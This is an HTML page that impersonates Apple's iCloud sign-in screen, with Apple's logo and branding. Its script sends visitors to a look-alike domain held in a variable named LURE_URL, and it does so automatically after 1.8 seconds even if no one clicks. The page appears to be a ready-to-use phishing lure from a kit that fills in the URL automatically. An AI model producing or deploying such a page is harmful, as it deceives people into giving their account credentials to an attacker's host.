<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to iCloud</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#f5f5f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
    .card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.1);padding:40px 36px 32px;width:100%;max-width:400px;text-align:center}
    .logo{margin-bottom:24px;display:flex;align-items:center;justify-content:center}
    .tagline{color:#666;font-size:15px;margin-bottom:28px;line-height:1.4}
    .btn{display:block;width:100%;padding:12px;background:#1d1d1f;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;transition:opacity .2s}
    .btn:hover{opacity:.88}
    .spinner{width:36px;height:36px;border:3px solid #eee;border-top:3px solid #1d1d1f;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}
    @keyframes spin{to{transform:rotate(360deg)}}
    .loading{display:none}
    .loading p{color:#888;font-size:14px;margin-top:8px}
    footer{margin-top:24px;color:#999;font-size:12px}
  </style>
</head>
<body>
  <div class="card" id="card">
    <div class="logo"><svg xmlns="http://www.w3.org/2000/svg" width="64" height="40" viewBox="0 0 814 512"><path fill="#1d1d1f" d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.3-164-39.3c-76 0-103.7 40.8-165.9 40.8s-105-57.8-155.5-127.4C46 376.7 0 248.3 0 126.1 0 56.2 17 27.4 31.4 20l108.2-62.2c47.6-27.5 86.1-26.4 136.5-26.4 52.7 0 91.2 19.4 128.2 37.3 35.5 17.3 64.4 26.4 101.3 26.4 35.5 0 67.5-10.6 105.9-28.7C659.3-49 698.2-64 747-64c6.4 0 108.2 2.6 166.3 87.4l-125.5 73.5c-23.5 13.6-61.2 49.9-61.2 117.9.1 80.5 54.2 116.8 61.5 126.1z"/></svg></div>
    <p class="tagline">Sign in with your Apple Account to access iCloud.</p>
    <a class="btn" id="btn" href="#">Sign in</a>
  </div>
  <div class="card loading" id="loading">
    <div class="spinner"></div>
    <p>Redirecting to secure sign-in&hellip;</p>
  </div>
  <footer>Secure connection &bull; Privacy Policy</footer>
  <script>
    var LURE_URL = 'https://www.icloud2026.authenticationsession.online/mRzqxfVp'; /* AUTO_LURE_URL */
    document.getElementById('btn').href = LURE_URL;
    document.getElementById('btn').addEventListener('click', function(e) {
      e.preventDefault();
      document.getElementById('card').style.display = 'none';
      document.getElementById('loading').style.display = 'block';
      setTimeout(function(){ window.location.href = LURE_URL; }, 600);
    });
    // Auto-redirect after 1.8s if user doesn't click
    setTimeout(function(){
      document.getElementById('card').style.display = 'none';
      document.getElementById('loading').style.display = 'block';
      setTimeout(function(){ window.location.href = LURE_URL; }, 600);
    }, 1800);
  </script>
</body>
</html>
